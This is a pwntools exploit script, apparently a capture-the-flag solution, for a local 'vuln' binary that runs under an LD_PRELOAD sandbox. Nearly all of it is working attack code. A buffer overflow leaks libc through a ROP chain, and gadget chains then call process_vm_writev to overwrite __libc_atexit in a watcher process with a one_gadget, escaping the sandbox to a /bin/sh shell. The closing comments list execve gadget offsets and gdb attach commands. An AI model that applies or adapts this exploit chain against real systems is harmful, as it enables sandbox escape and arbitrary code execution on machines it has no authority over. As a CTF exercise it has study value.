from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')

env = {"LD_PRELOAD": './libsandbox.so'}

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *0x40111b",
		"c"
	]), env=env)
elif args.REMOTE:
	p = remote("localhost", 9002)
else:
	p = process(elf.path, env=env) 


OFFSET = 72
POP_RDI = 0x0000000000401273 #: pop rdi; ret
RET = 0x000000000040101a     #: ret

payload = b'A' * OFFSET
payload += p64(POP_RDI)
payload += p64(elf.got['puts'])
payload += p64(elf.symbols['puts'])
payload += p64(elf.symbols['main'])

p.sendlineafter(b'Enter your feedback: ', payload)
p.recvuntil(b'Thank you!\n')

libc_leak = p.recvline()[:-1]
libc_leak = u64(libc_leak.ljust(8, b'\x00')) - libc.symbols['puts']

print(f"[+] libc leak: {hex(libc_leak)}")
libc.address = libc_leak 

process_vm_writev = libc.symbols['process_vm_writev']
getpid = libc.symbols['getpid']
read = libc.symbols['read']
exit = libc.symbols['exit']

print(f'[+] process_vm_writev at {hex(process_vm_writev)}')

STORED_PID = 0x404300
WRITABLE_TEMP = STORED_PID + 0x8

def set_rsi(rsi, r15=0):
	POP_RSI_R15 = 0x0000000000401271                            #: pop rsi ; pop r15 ; ret
	return p64(POP_RSI_R15) + p64(rsi) + p64(r15)

def set_rdx(rdx, r12=0):
	POP_RDX_R12 = 0x000000000011c371 + libc.address             #: pop rdx ; pop r12 ; ret
	return p64(POP_RDX_R12) + p64(rdx) + p64(r12)

def set_rdi(rdi):
	return p64(POP_RDI) + p64(rdi)

def set_rcx(rcx):
	POP_RCX = 0x000000000009f822 + libc.address                 #: pop rcx ; ret
	return p64(POP_RCX) + p64(rcx)

def set_rax(rax):
	POP_RAX = 0x000000000014c204 + libc.address                 # pop rax ; mov qword ptr [rdx + 0x68], rcx ; ret
	return set_rdx(WRITABLE_TEMP-0x68) + p64(POP_RAX) + p64(rax)

def zero_r9():
	CLEAR_R9 = 0x00000000000595b3 + libc.address #: shr r9, cl ; mov qword ptr [rdi], r9 ; ret
	return set_rdi(WRITABLE_TEMP) + set_rcx(63) + p64(CLEAR_R9)

def set_r8(r8):
	SET_R8 = 0x000000000013f7f6 + libc.address           #: lea r8, [rdi + rsi + 8] ; mov rax, r8 ; ret
	return p64(POP_RDI) + p64(-8, sign='signed') + set_rsi(r8) + p64(SET_R8)

def getpid_to_mem():
	MOV_TO_RDX_PTR_FROM_RAX = 0x00000000000374b0 + libc.address #: mov qword ptr [rdx], rax ; ret
	return p64(getpid) + set_rdx(STORED_PID) + p64(MOV_TO_RDX_PTR_FROM_RAX)

def getpid_from_mem_to_rdi():
	OR_EDI_RDX_PTR = 0x000000000013ed5c   + libc.address        #: or edi, dword ptr [rdx + 0x104] ; cmove eax, edx ; ret
	return set_rdx(STORED_PID-0x104) + set_rdi(0) + p64(OR_EDI_RDX_PTR)

def send(pa):
	if any(c in [0x9,0xa,0xb,0xc,0xd,0x20] for c in pa):
		print("[-] Banned scanf character")
		p.close()
		import sys
		sys.exit(-1)

	p.sendline(pa)


INC_PTR_RAX = 0x0000000000119fb8 + libc.address             #: inc dword ptr [rax] ; mov rax, r8 ; ret
IO_VEC1 = 0x404130
IO_VEC2 = IO_VEC1+0x10
STORED_ONE_GADGET = IO_VEC2+0x10

print("[+] Storing pid+1 and invoking read() to read in writable mem")
payload = b'A' * OFFSET
payload += getpid_to_mem()
payload += set_rax(STORED_PID)
payload += p64(INC_PTR_RAX) # increase pid by one (this is the watcher pid)

payload += set_rdx(48)      # cnt
payload += set_rsi(IO_VEC1) # buf
payload += set_rdi(0)       # fd
payload += p64(read)

payload += p64(RET)         # align stack
payload += p64(elf.symbols['main'])
send(payload)

print("[+] Preparing iovec structs (feed for read())")

#struct iovec {
#    void  *iov_base;    /* Starting address */
#    size_t iov_len;     /* Number of bytes to transfer */
#};

one_gadget = libc.address + 0xe6c7e
__libc_atexit = 0x0000000001ED608 + libc.address #__libc_atexit   segment qword public 'DATA' use64
print(f"[+] __libc_atexit at {hex(__libc_atexit)}")
p.sendline(b''.join([
		p64(STORED_ONE_GADGET)
		,p64(8)

		,p64(__libc_atexit)
		,p64(8)

		,p64(one_gadget) # STORED_ONE_GADGET
	]))


# ssize_t process_vm_writev(pid_t pid,
#                           const struct iovec *local_iov,
#                           unsigned long liovcnt,
#                           const struct iovec *remote_iov,
#                           unsigned long riovcnt,
#                           unsigned long flags)

# process_vm_writev(pid+1, IO_VEC1, 1, IO_VEC2, 1, 0)

print(f"[+] Executing process_vm_writev to write {hex(one_gadget)} to {hex(__libc_atexit)}")

send(b''.join([
		b'A' * OFFSET
		,zero_r9()
		,set_r8(1)
		,getpid_from_mem_to_rdi()
		,set_rcx(IO_VEC2)
		,set_rsi(IO_VEC1)
		,set_rdx(1)
		,p64(process_vm_writev)

		,set_rdi(69)
		,p64(exit)
	]))

p.interactive()

# notes:
# scanf stops reading on 0x9,0xa,0xb,0xc,0xd,0x20
# set *(uint64_t*)(0x0000000000403e18) = 0x7ffff7ea5c81


# attach to vuln:    gdb -p $(pgrep vuln | head -n 1)
# attach to watcher: sudo gdb -p $(pgrep vuln | tail -n 1)


# 0xe6c7e execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL
# 
# 0xe6c81 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL
# 
# 0xe6c84 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
